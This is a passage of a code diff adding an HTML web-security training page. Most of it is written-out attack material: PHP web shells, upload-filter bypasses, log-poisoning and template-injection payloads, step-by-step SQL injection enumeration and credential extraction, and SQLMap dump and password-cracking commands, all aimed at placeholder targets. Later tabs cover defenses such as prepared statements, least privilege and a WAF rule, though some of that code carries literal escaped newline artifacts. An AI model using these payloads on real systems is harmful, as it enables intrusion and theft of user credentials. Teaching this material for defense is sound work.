+                        <li>' (single quote) = %27</li>
+                        <li>$ = %24</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 8: Payload Delivery -->
+            <div class="tab-content" id="rce-payload">
+                <h2>Payload Delivery Methods</h2>
+                <p class="subtitle">Getting Web Shells & Codes on Target</p>
+
+                <div class="info-card">
+                    <h3>Common Delivery Mechanisms</h3>
+                    <ul>
+                        <li><strong>File Upload:</strong> Direct upload via web form</li>
+                        <li><strong>ZIP/Archive Extraction:</strong> Upload ZIP, then extract</li>
+                        <li><strong>FTP/SCP Upload:</strong> If credentials obtained</li>
+                        <li><strong>Directory Traversal:</strong> Write via ../ path traversal</li>
+                        <li><strong>Log File Injection:</strong> Inject code into logs, then include</li>
+                        <li><strong>Database Query:</strong> Write shell via SQL injection</li>
+                        <li><strong>Git/SVN Deployment:</strong> Exploit deployment scripts</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Method 1: Direct File Upload</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Create Payload</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Create simple PHP shell
+$ cat > shell.php << 'EOF'
+&lt;?php system($_GET['cmd']); ?&gt;
+EOF
+
+# Or more sophisticated shell
+$ cat > admin.php << 'EOF'
+&lt;?php
+session_start();
+if(!isset($_SESSION['loggedin'])) {
+    $_SESSION['loggedin'] = true;
+}
+if(isset($_POST['cmd'])) {
+    $output = shell_exec($_POST['cmd']);
+}
+?&gt;
+[HTML form here]
+EOF
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Upload via Form</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Using curl to upload
+$ curl -F "upload=@shell.php" http://target.com/upload.php
+
+# Using wget
+$ wget --post-file=shell.php http://target.com/uploadfile
+
+# Using Python
+python -c "import requests; 
+requests.post('http://target.com/upload.php', 
+files={'file': open('shell.php','rb')})"
+
+# Via browser - manual upload
+1. Navigate to http://target.com/upload.php
+2. Click "Choose File" and select shell.php
+3. Click Upload
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Locate & Access Shell</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Common upload locations
+/uploads/
+/files/
+/downloads/
+/attachments/
+/images/
+/media/
+/tmp
+
+# Try to find uploaded shell
+http://target.com/uploads/shell.php?cmd=whoami
+
+# If not found, scan for it
+$ curl http://target.com/uploads/shell.php
+
+# Check web server error log
+$ curl http://target.com/uploads/nothere.php
+# See where file would go
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Method 2: Bypassing Upload Filters</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Filter Bypass Techniques</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Technique 1: Double extension
+shell.php.jpg
+shell.phtml
+shell.php5
+shell.shtml
+
+# Technique 2: Null byte injection
+shell.php%00.jpg
+
+# Technique 3: Case variation
+shell.pHp
+shell.PhP
+SHELL.PHP
+
+# Technique 4: Polyglot file
+Binary of valid image + PHP code appended
+
+# Technique 5: .htaccess upload
+AddType application/x-httpd-php .jpg
+# Then upload shell.jpg
+
+# Technique 6: HTML form upload
+While form says .jpg only, intercept with Burp
+Change filename to shell.php
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Method 3: Log File Injection</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Inject into Log</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Apache access log injection
+# Send malicious User-Agent
+curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target.com/
+
+# Log files location:
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+# Now include log as PHP:
+http://target.com/index.php?page=../../var/log/apache2/access.log
+# PHP processes and executes embedded code
+</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab 9: Attack Scenarios -->
+            <div class="tab-content" id="rce-scenarios">
+                <h2>Real-World RCE Scenarios</h2>
+                <p class="subtitle">Common Exploitation Patterns</p>
+
+                <div class="scenario-card">
+                    <h3>Scenario 1: WordPress Plugin Vulnerability</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Vulnerability Discovery</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Scan for WordPress
+$ curl -s http://target.com/wp-admin/ | grep -q WordPress && echo "WordPress Found"
+
+# Identify plugins
+$ curl -s http://target.com/wp-content/plugins/ | grep href | cut -d'"' -f2
+
+# Output:
+file-manager/
+plugin-security/
+custom-upload/
+
+# Check plugin version in readme.txt
+$ curl http://target.com/wp-content/plugins/file-manager/readme.txt | head -5
+Stable tag: 6.9
+# Known vulnerability in versions < 6.10
+                            </code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Access Vulnerable Endpoint</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># File Manager plugin has upload endpoint
+http://target.com/wp-content/plugins/file-manager/upload.php
+
+# POST request to upload endpoint
+POST /wp-content/plugins/file-manager/upload.php HTTP/1.1
+Host: target.com
+
+file=shell.php&path=/uploads/
+
+# No authentication required in vulnerable version
+# Server saves file to /wp-content/uploads/shell.php
+                            </code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Execute Shell</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Access uploaded shell
+http://target.com/wp-content/uploads/shell.php?cmd=whoami
+
+# Output:
+www-data
+
+# Read WordPress database credentials
+http://target.com/wp-content/uploads/shell.php?cmd=cat%20../wp-config.php
+
+// ** MySQL settings ** //
+define('DB_NAME', 'wordpress_db');
+define('DB_USER', 'wp_user');
+define('DB_PASSWORD', 'MySecurePass123!');
+
+# Now attacker has database credentials
+# Can access all WordPress user data, posts, etc.
+                            </code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 2: Shared Hosting File Upload</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Identify Upload Functionality</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Shared hosting site with profile avatar upload
+http://target.com/account/upload-avatar.php
+
+# Form accepts .jpg, .png, .gif
+# File size limit: 5MB
+# Saves to /uploads/avatars/
+
+# Typical validation:
+if ($_FILES['avatar']['type'] == 'image/jpeg') {
+    move_uploaded_file($_FILES['avatar']['tmp_name'], 
+    '/var/www/html/uploads/avatars/' . $_FILES['avatar']['name']);
+}
+
+# Only checks MIME type, not file extension
+                            </code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Bypass MIME Check</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Create PHP file with JPEG header
+$ printf '\xff\xd8\xff\xe0\x00\x10JFIF' > shell.php
+$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' >> shell.php
+
+# File now has JPEG magic bytes
+# But contains executable PHP code
+
+# Alternative: Use GIF header
+$ printf 'GIF89a' > shell.php
+$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' >> shell.php
+
+# Upload as shell.php
+# Server sees GIF/JPEG MIME type, allows upload
+                            </code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Apache Executes PHP</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Shell uploaded to /uploads/avatars/shell.php
+
+# Access shell
+http://target.com/uploads/avatars/shell.php?cmd=whoami
+
+# PHP header doesn't matter to Apache
+# Apache sees .php extension and executes it
+# Output:<br>www-data
+
+# File may appear as image in file manager
+# But executes as PHP when accessed via browser
+                            </code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 3: Template Injection in CMS</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Identify Template Processing</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># CMS allows custom email templates
+# Template engine: Twig, Jinja2, Smarty
+
+# Vulnerable code:
+$template = $_POST['email_template'];
+$twig->render($template);
+
+# User can inject template code
+# {{ 7 * 7 }} renders as 49
+# {{ system('whoami') }} executes command
+
+# Template input:
+{{ system('cat /etc/passwd') }}
+                            </code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: RCE via Template</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Different template engines, different payloads
+
+# Twig (PHP):
+{{ _self.env.registerUndefinedFilterCallback("exec") }}
+{{ "whoami"|unsafe }}
+
+# Jinja2 (Python):
+{{ config.update(request.args) }} - gives access to globals
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
+
+# Smarty (PHP):
+{php}system('whoami');{/php}
+
+# Result: Full RCE with template engine privileges
+                            </code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab 10: SQL Injection Introduction -->
+            <div class="tab-content" id="sql-intro">
+                <h2>SQL Injection Fundamentals</h2>
+                <p class="subtitle">Understanding Database Exploitation</p>
+
+                <div class="info-card">
+                    <h3>What is SQL Injection?</h3>
+                    <p>SQL Injection is a code injection technique where attackers insert malicious SQL statements into entry fields. This allows them to manipulate database queries and access unauthorized data.</p>
+                </div>
+
+                <div class="code-example">
+                    <h4>Vulnerable PHP Code:</h4>
+                    <pre><code>$user = $_GET['user'];
+$password = $_GET['pass'];
+$query = "SELECT * FROM users WHERE username='$user' AND password='$password'";
+$result = mysql_query($query);
+if(mysql_num_rows($result) > 0) {
+    echo "Login Successful";
+}</code></pre>
+                </div>
+
+                <div class="threat-spectrum">
+                    <strong>SQL Injection Methods:</strong>
+                    <div class="spectrum-visual" style="display: grid; grid-template-columns: 1fr 1fr;">
+                        <div class="spectrum-item">Union-Based</div>
+                        <div class="spectrum-item">Time-Based Blind</div>
+                        <div class="spectrum-item">Boolean-Based Blind</div>
+                        <div class="spectrum-item">Error-Based</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab 11: SQL Attack Examples -->
+            <div class="tab-content" id="sql-examples">
+                <h2>SQL Injection Attack Examples</h2>
+                <p class="subtitle">Practical Exploitation Techniques</p>
+
+                <div class="attack-card">
+                    <h3>Example 1: Authentication Bypass</h3>
+                    <pre><code># Input in username field:
+admin' --
+
+# Results in query:
+SELECT * FROM users WHERE username='admin' --' AND password='anything'
+
+# The -- comments out the password check
+# Attacker logs in as admin without a password
+                    </code></pre>
+                </div>
+
+                <div class="attack-card">
+                    <h3>Example 2: Union-Based SQL Injection</h3>
+                    <pre><code># Vulnerable parameter: id=1
+# Attacker injects: id=1 UNION SELECT 1,username,password,4 FROM users--
+
+# This returns user credentials alongside normal data
+# Attacker can extract usernames and password hashes
+                    </code></pre>
+                </div>
+
+                <div class="attack-card">
+                    <h3>Example 3: Stacked Queries</h3>
+                    <pre><code># Some databases allow multiple queries:
+id=1; DROP TABLE users;--
+
+# This could delete entire tables
+# Demonstrates severity of SQL injection vulnerabilities
+                    </code></pre>
+                </div>
+
+                <div class="attack-card">
+                    <h3>Example 4: Time-Based Blind SQL Injection</h3>
+                    <pre><code># When error messages are suppressed
+# Attacker uses response time to detect successful injection
+
+# Payload:
+username=admin' AND SLEEP(5)--
+
+# Server response:
+- Successful query = 5 second delay
+- Failed query = normal response time
+
+# Attacker can brute force character by character:
+username=admin' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
+
+# If 5 second delay = 'a' is correct
+# If no delay = try next character
+                    </code></pre>
+                </div>
+
+                <div class="attack-card">
+                    <h3>Example 5: Boolean-Based Blind SQL Injection</h3>
+                    <pre><code># Detecting true/false states from responses
+
+id=1' AND 1=1--     (returns results)
+id=1' AND 1=2--     (returns no results)
+
+# Attacker uses true/false responses to extract data:
+id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+
+# True response = page shows user
+# False response = page shows "User not found"
+
+# Can extract entire database by checking one character at a time
+# Slower than union-based but works against protected databases
+                    </code></pre>
+                </div>
+            </div>
+
+            <!-- Tab 12: Database Enumeration -->
+            <div class="tab-content" id="sql-enumeration">
+                <h2>Database Enumeration Techniques</h2>
+                <p class="subtitle">Extracting Database Structure Information</p>
+
+                <div class="enum-card">
+                    <h3>Step 1: Identify Database Type</h3>
+                    <pre><code># MySQL - Version queries:
+SELECT @@version           # MySQL 8.0.30
+SELECT version()           # Same result
+SELECT @@datadir          # /var/lib/mysql/
+
+# MSSQL (SQL Server):
+SELECT @@VERSION          # Microsoft SQL Server 2019
+SELECT @@SERVERNAME       # SQLSERVER01
+SELECT DB_NAME()          # current_database
+
+# PostgreSQL:
+SELECT version()          # PostgreSQL 13.0 on x86_64
+SELECT current_database() # postgres
+
+# Oracle:
+SELECT banner FROM v$version
+SELECT * FROM v$instance
+
+# SQLite:
+SELECT sqlite_version()   # 3.35.0
+SELECT file FROM pragma_database_list
+
+# Payload injection example:
+http://target.com/product.php?id=1 UNION SELECT 1,version(),3,4
+
+# Response in page shows:
+MySQL 8.0.30 - now know database type
+                    </code></pre>
+                </div>
+
+                <div class="enum-card">
+                    <h3>Step 2: Determine Column Count</h3>
+                    <pre><code># Use ORDER BY to find number of columns:
+id=1 ORDER BY 1           (works)
+id=1 ORDER BY 2           (works)
+id=1 ORDER BY 3           (works)
+id=1 ORDER BY 4           (error - only 3 columns)
+
+# When error occurs, you know there are 3 columns
+# Or use UNION with NULL:
+id=1 UNION SELECT NULL    (error - wrong number)
+id=1 UNION SELECT NULL,NULL  (error - wrong number)
+id=1 UNION SELECT NULL,NULL,NULL  (success - 3 columns)
+
+# Now ready for enumeration with correct column count
+                    </code></pre>
+                </div>
+
+                <div class="enum-card">
+                    <h3>Step 3: Enumerate Databases</h3>
+                    <pre><code># MySQL - List all databases:
+id=1 UNION SELECT 1,schema_name,3 FROM information_schema.schemata
+
+# Results:
+information_schema
+mysql
+performance_schema
+wordpress_db
+shop_database
+admin_users
+
+# PostgreSQL - List databases:
+id=1 UNION SELECT 1,datname,3 FROM pg_database
+
+# MSSQL - List databases:
+id=1 UNION SELECT 1,name,3 FROM sys.databases
+
+# Now know which databases to target
+                    </code></pre>
+                </div>
+
+                <div class="enum-card">
+                    <h3>Step 4: Enumerate Tables</h3>
+                    <pre><code># MySQL - List tables in target database:
+id=1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='wordpress_db'
+
+# Results:
+wp_posts
+wp_postmeta
+wp_users          <-- IMPORTANT
+wp_usermeta       <-- IMPORTANT
+wp_options
+wp_links
+
+# PostgreSQL - List tables:
+id=1 UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'
+
+# MSSQL - List tables:
+id=1 UNION SELECT 1,TABLE_NAME,3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='wordpress_db'
+
+# Identify attractive tables: users, admin, passwords, secrets, config
+                    </code></pre>
+                </div>
+
+                <div class="enum-card">
+                    <h3>Step 5: Enumerate Columns (Schema Discovery)</h3>
+                    <pre><code># MySQL - List columns in wp_users table:
+id=1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='wp_users' AND table_schema='wordpress_db'
+
+# Results:
+ID
+user_login
+user_email      <-- Email addresses
+user_pass       <-- Password hashes
+user_registered
+user_status
+user_url
+display_name
+
+# PostgreSQL - List columns:
+id=1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='wp_users'
+
+# MSSQL:
+id=1 UNION SELECT 1,COLUMN_NAME,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='wp_users'
+
+# Now know exact column names to extract
+                    </code></pre>
+                </div>
+
+                <div class="enum-card">
+                    <h3>Step 6: Extract Data</h3>
+                    <pre><code># Extract usernames and emails:
+id=1 UNION SELECT 1,CONCAT(user_login,':',user_email),3 FROM wordpress_db.wp_users
+
+# Results:
+admin:admin@company.com
+jsmith:jsmith@company.com
+mjones:mjones@company.com
+
+# Extract passwords:
+id=1 UNION SELECT 1,CONCAT(user_login,':',user_pass),3 FROM wordpress_db.wp_users
+
+# Results:
+admin:$P$B8K...(WordPress hash)...
+jsmith:$P$A2L...(WordPress hash)...
+
+# Extract sensitive configuration:
+id=1 UNION SELECT 1,CONCAT(option_name,':',option_value),3 FROM wordpress_db.wp_options WHERE option_name IN ('siteurl','admin_email','users_can_register')
+
+# Results:
+siteurl:http://target.com
+admin_email:admin@company.com
+users_can_register:1
+
+# Extract everything from a table:
+id=1 UNION SELECT 1,GROUP_CONCAT(CONCAT(user_login,':',user_email,':',user_pass) SEPARATOR '|'),3 FROM wordpress_db.wp_users
+
+# Attacker now has all user credentials
+                    </code></pre>
+                </div>
+            </div>
+
+            <!-- Tab 13: SQLMap Tool -->
+            <div class="tab-content" id="sql-tools">
+                <h2>Automated SQL Injection: SQLMap</h2>
+                <p class="subtitle">Automated SQL Injection Testing Framework</p>
+
+                <div class="tool-card">
+                    <h3>What is SQLMap?</h3>
+                    <p>SQLMap is an open-source penetration testing tool that automates detection and exploitation of SQL injection vulnerabilities. It supports all major database types and injection techniques. Far faster and more effective than manual exploitation.</p>
+                </div>
+
+                <div class="usage-card">
+                    <h4>Installation:</h4>
+                    <pre><code># Clone from GitHub
+$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+$ cd sqlmap
+$ python sqlmap.py --version
+
+# Or install via package manager
+$ apt-get install sqlmap      # Debian/Ubuntu
+$ brew install sqlmap         # macOS
+$ pacman -S sqlmap           # Arch Linux
+
+# Verify installation
+$ python sqlmap.py -h
+sqlmap/1.6.0 - automatic SQL injection and database takeover tool
+                    </code></pre>
+                </div>
+
+                <div class="usage-card">
+                    <h4>Basic Discovery - Detect SQL Injection:</h4>
+                    <pre><code># Test URL for injection vulnerability
+$ sqlmap -u "http://target.com/page.php?id=1"
+
+# SQLMap automatically:
+# 1. Tests different injection techniques
+# 2. Identifies vulnerable parameter
+# 3. Detects database type
+
+Output:
+[INFO] testing connection to the target URL
+[INFO] testing if GET parameter 'id' is dynamic
+[*] GET parameter 'id' appears to be dynamic
+[INFO] heuristic (basic) test shows that GET parameter 'id' might be vulnerable to SQL injection attacks
+[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[CRITICAL] GET parameter 'id' is vulnerable to SQL injection attacks
+[INFO] Payload: 1 AND CEBCC=CEBCC
+
+# Now can proceed with enumeration
+                    </code></pre>
+                </div>
+
+                <div class="usage-card">
+                    <h4>Database Enumeration:</h4>
+                    <pre><code># List all databases:
+$ sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+Output:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] wordpress_db
+[*] admin_panel
+
+# List tables in specific database:
+$ sqlmap -u "http://target.com/page.php?id=1" -D wordpress_db --tables
+
+Output:
+[*] wp_posts
+[*] wp_users
+[*] wp_postmeta
+
+# List columns in specific table:
+$ sqlmap -u "http://target.com/page.php?id=1" -D wordpress_db -T wp_users --columns
+
+Output:
+[*] ID (INT)
+[*] user_login (VARCHAR)
+[*] user_email (VARCHAR)
+[*] user_pass (VARCHAR)
+[*] user_registered (DATETIME)
+                    </code></pre>
+                </div>
+
+                <div class="usage-card">
+                    <h4>Data Extraction - Dump Data:</h4>
+                    <pre><code># Dump entire database:
+$ sqlmap -u "http://target.com/page.php?id=1" --dump
+
+# Dump specific table:
+$ sqlmap -u "http://target.com/page.php?id=1" -D wordpress_db -T wp_users --dump
+
+Output:
+Database: wordpress_db
+Table: wp_users
+[3 entries]
++----+----------+----------+-------------------+
+| ID | user_login | user_pass | user_email         |
++----+----------+----------+-------------------+
+| 1  | admin    | $P$Bdz... | admin@company.com  |
+| 2  | jsmith   | $P$Adf... | jsmith@company.com |
+| 3  | mjones   | $P$Cka... | mjones@company.com |
++----+----------+----------+-------------------+
+
+# Dump with password cracking:
+$ sqlmap -u "http://target.com/page.php?id=1" -D wordpress_db -T wp_users --dump --passwords
+
+# SQLMap automatically cracks weak passwords:
+[INFO] attempting to crack password hashes
+Database: wordpress_db | User: admin | Password: P@ssw0rd123
+Database: wordpress_db | User: jsmith | Password: Welcome2024!
+                    </code></pre>
+                </div>
+
+                <div class="usage-card">
+                    <h4>Advanced Options:</h4>
+                    <pre><code># POST data injection:
+$ sqlmap -u "http://target.com/login.php" --data="username=test&password=test" --dbs
+
+# Cookie-based authentication:
+$ sqlmap -u "http://target.com/admin/" --cookie="PHPSESSID=abc123xyz" --dbs
+
+# Custom headers:
+$ sqlmap -u "http://target.com/api/" -H "Authorization: Bearer TOKEN" --dbs
+
+# Specific injection technique (faster if known):
+$ sqlmap -u "http://target.com/page.php?id=1" --technique=U   # UNION-based only
+$ sqlmap -u "http://target.com/page.php?id=1" --technique=T   # Time-based blind
+$ sqlmap -u "http://target.com/page.php?id=1" --technique=E   # Error-based
+
+# Aggressive testing:
+$ sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --dbs
+# Slower but finds more vulnerabilities
+
+# Output to file:
+$ sqlmap -u "http://target.com/page.php?id=1" --dump -D wordpress_db --csv-del "," -o output.csv
+
+# Interactive mode - process found data:
+$ sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
+# No prompts, automatically select all options
+                    </code></pre>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ SQLMap Workflow</h3>
+                    <ol style="list-style: decimal; margin-left: 20px;">
+                        <li>Test target URL for SQL injection vulnerability</li>
+                        <li>Identify vulnerable parameter and database type</li>
+                        <li>List available databases</li>
+                        <li>Select target database and list tables</li>
+                        <li>Identify valuable tables (users, admin, config)</li>
+                        <li>Dump sensitive data (credentials, emails, etc)</li>
+                        <li>Crack password hashes if needed</li>
+                        <li>Use extracted credentials for further access</li>
+                    </ol>
+                </div>
+            </div>
+
+            <!-- Tab 14: Prevention Strategies -->
+            <div class="tab-content" id="sql-prevention">
+                <h2>SQL Injection Prevention</h2>
+                <p class="subtitle">Defensive Coding Practices</p>
+
+                <div class="defense-card">
+                    <h3>1. Parameterized Queries / Prepared Statements</h3>
+                    <p><strong>Best Practice:</strong> Always separate SQL code from user data</p>
+                    <pre><code># WRONG - Vulnerable to SQL Injection:
+$query = "SELECT * FROM users WHERE username='" . $_GET['user'] . "'";
+$result = mysql_query($query);
+# If user inputs: admin' OR '1'='1  <- SQL injection!
+
+# CORRECT - Prepared Statement (PHP PDO):
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$_GET['user']]);
+$result = $stmt->fetchAll();
+
+# CORRECT - Named Parameters:
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND email = :email");
+$stmt->execute([':username' => $_GET['user'], ':email' => $_GET['email']]);
+
+# CORRECT - Prepared Statement (MySQLi):
+$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->bind_param(\"s\", $_GET['user']);  # 's' = string type
+$stmt->execute();
+$result = $stmt->get_result();
+
+# How it works:
+# 1. SQL structure sent to database first\n# 2. Database parser processes SQL structure\n# 3. User data sent separately\n# 4. Database treats user data as DATA, not SQL code\n# 5. Even if user data contains SQL keywords, they're treated as strings
+                    </code></pre>
+                </div>
+
+                <div class=\"defense-card\">\n                    <h3>2. Input Validation (Whitelist Approach)</h3>\n                    <pre><code># Validate ID is numeric:\nif (!ctype_digit($_GET['id']) || $_GET['id'] < 0 || $_GET['id'] > 9999999) {\n    die('Invalid ID format');\n}\n\n# Validate email format:\nif (!filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {\n    die('Invalid email format');\n}\n\n# Validate against allowed values:\n$allowed_sort = ['name', 'date', 'price'];\nif (!in_array($_GET['sort'], $allowed_sort)) {\n    die('Invalid sort parameter');\n}\n\n# Strict type checking:\n$id = (int)$_GET['id'];  # Force to integer\n$price = (float)$_GET['price'];  # Force to float\n\n# Length validation:\nif (strlen($_GET['search']) > 50 || strlen($_GET['search']) < 1) {\n    die('Invalid search length');\n}\n\n# Pattern matching:\nif (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $_GET['username'])) {\n    die('Invalid username format');\n}\n\n# Server-side validation ONLY:\n# Client-side validation can be bypassed\n# Always validate on the server\n                    </code></pre>\n                </div>\n\n                <div class=\"defense-card\">\n                    <h3>3. Escape User Input (Defense in Depth)</h3>\n                    <pre><code># NOT a primary defense, but additional layer\n# Only use with prepared statements\n\n# PHP MySQLi - Escape strings:\n$escaped = $mysqli->real_escape_string($_GET['user']);\n$query = \"SELECT * FROM users WHERE username='$escaped'\";\n\n# PHP PDO - Quote input:\n$escaped = $pdo->quote($_GET['user']);\n$query = \"SELECT * FROM users WHERE username=$escaped\";\n\n# Important: These are NOT sufficient alone\n# Must use prepared statements as primary defense\n                    </code></pre>\n                </div>\n\n                <div class=\"defense-card\">\n                    <h3>4. Least Privilege Database User</h3>\n                    <pre><code># Create separate database users for different functions\n\n# WRONG - Using admin account:\n$user = 'root';\n$pass = 'admin123';\n$mysqli = new mysqli('localhost', $user, $pass, 'wordpress_db');\n# If SQL injection occurs, attacker has admin privileges\n\n# CORRECT - Limited privilege account:\nCREATE USER 'webapp'@'localhost' IDENTIFIED BY 'SecurePass123';\nGRANT SELECT, INSERT, UPDATE ON wordpress_db.wp_posts TO 'webapp'@'localhost';\nGRANT SELECT, INSERT, UPDATE ON wordpress_db.wp_users TO 'webapp'@'localhost';\nREVOKE DELETE, DROP, CREATE ON *.* FROM 'webapp'@'localhost';\n\n# Connect with limited user:\n$user = 'webapp';\n$pass = 'SecurePass123';\n$mysqli = new mysqli('localhost', $user, $pass, 'wordpress_db');\n\n# Now even if attacker exploits SQL injection:\n# - Cannot drop tables (no DROP privilege)\n# - Cannot access other databases\n# - Cannot modify table structure\n# - Limited to SELECT, INSERT, UPDATE on specific tables\n\n# For read-only operations:\nCREATE USER 'report'@'localhost' IDENTIFIED BY 'ReportPass123';\nGRANT SELECT ON wordpress_db.* TO 'report'@'localhost';\n# Can only read, cannot modify data\n                    </code></pre>\n                </div>\n\n                <div class=\"defense-card\">\n                    <h3>5. Error Handling & Information Disclosure</h3>\n                    <pre><code># WRONG - Shows database structure:\n$result = mysql_query($query) or die('Error: ' . mysql_error());\n# Output: \"Error: Column 'username' doesn't exist in on clause\"\n# Attacker learns table structure!\n\n# CORRECT - Generic error to user:\nset_error_handler(function() {\n    if ($_SERVER['ENVIRONMENT'] === 'production') {\n        die('An error occurred. Please try again later.');\n    }\n});\n\n$result = $stmt->execute();\nif (!$result) {\n    // Log detailed error to file (not shown to user)\n    error_log('Database error: ' . $stmt->error);\n    die('Database error.');\n}\n\n# In development:\nini_set('display_errors', 1);\n// Show detailed errors\n\n# In production:\nini_set('display_errors', 0);\nerror_reporting(E_ALL);\nini_set('log_errors', 1);\nini_set('error_log', '/var/log/php-errors.log');\n// Log to file, show nothing to user\n                    </code></pre>\n                </div>\n\n                <div class=\"defense-card\">\n                    <h3>6. Web Application Firewall (WAF)</h3>\n                    <p>Additional layer of defense monitoring HTTP requests</p>\n                    <pre><code># ModSecurity (Apache mod_security)\n# Rules detect common SQL injection patterns\n\nSecRule ARGS \"(union|select|from|where|insert|update|delete|drop|create|alter)\" \\\n    \"chain,phase:2,deny,status:403,msg:'SQL Injection Attempt'\"\n    SecRule ARGS \"(;|--|/\\*|\\*/)\"\n\n# WAF can:\n# - Block requests matching SQL injection patterns\n# - Log suspicious activity\n# - Alert security team\n# - Rate limit suspicious IPs\n\n# Examples blocked:\n# /page.php?id=1 UNION SELECT 1,2,3  <- BlockedAT\n# /login.php?user=admin' OR '1'='1    <- Blocked\n# /search.php?q=test'; DROP TABLE--   <- Blocked\n\n# Note: WAF is not primary defense\n# Still need proper input validation and prepared statements\n                    </code></pre>\n                </div>\n            </div>
+
+            <!-- Tab 15: Defense Strategies Overview -->
+            <div class="tab-content" id="defense">
+                <h2>Comprehensive Defense Strategies</h2>
+                <p class="subtitle">Multi-Layer Security Approach</p>
+
+                <div class="defense-comparison">
+                    <h3>Defense Against Web Shells & RCE</h3>
+                    <table class="defense-table">
+                        <tr>
+                            <th>Attack Vector</th>
+                            <th>Prevention Method</th>
+                            <th>Implementation</th>
+                            <th>Effectiveness</th>
+                        </tr>
+                        <tr>
+                            <td>File Upload</td>
+                            <td>Whitelist file types, store outside webroot</td>
+                            <td>Check file extension & MIME type, store in /var/uploads (not /var/www)</td>
+                            <td>Very High</td>
+                        </tr>
+                        <tr>
+                            <td>Dangerous PHP Functions</td>
+                            <td>Disable via php.ini</td>
+                            <td>disable_functions = system,exec,shell_exec,passthru,proc_open</td>
+                            <td>Highest</td>
+                        </tr>
+                        <tr>
+                            <td>Parameter Injection</td>
+                            <td>Input validation & escapeshellarg()</td>
+                            <td>Validate input whitelist, use escapeshellarg() if needed</td>
+                            <td>High</td>
+                        </tr>
+                        <tr>
+                            <td>Process Execution</td>
